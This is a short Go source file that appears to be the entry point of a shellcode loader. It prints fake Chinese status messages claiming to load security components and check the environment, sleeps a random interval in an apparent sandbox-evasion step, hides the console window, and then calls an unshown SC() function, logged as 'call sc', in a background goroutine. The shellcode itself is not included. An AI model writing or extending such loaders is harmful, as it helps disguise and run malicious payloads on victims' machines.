package main

import (
	"flag"
	"fmt"
	"time"
)

var (
	console bool
)

func main() {
	fmt.Println("[+] 加载安全组件")
	fmt.Println("[+] 环境检查")
	time.Sleep(time.Second * time.Duration(2+time.Now().Unix()%5))
	fmt.Println("[+] 完成即将关闭窗口")
	window(console)

	stop := make(chan bool, 1)
	go func() {
		fmt.Println("[+] call sc")
		SC()
	}()
	<-stop
}

func initialize() {
	flag.BoolVar(&console, "console", false, "信息输出")
	flag.Parse()
}
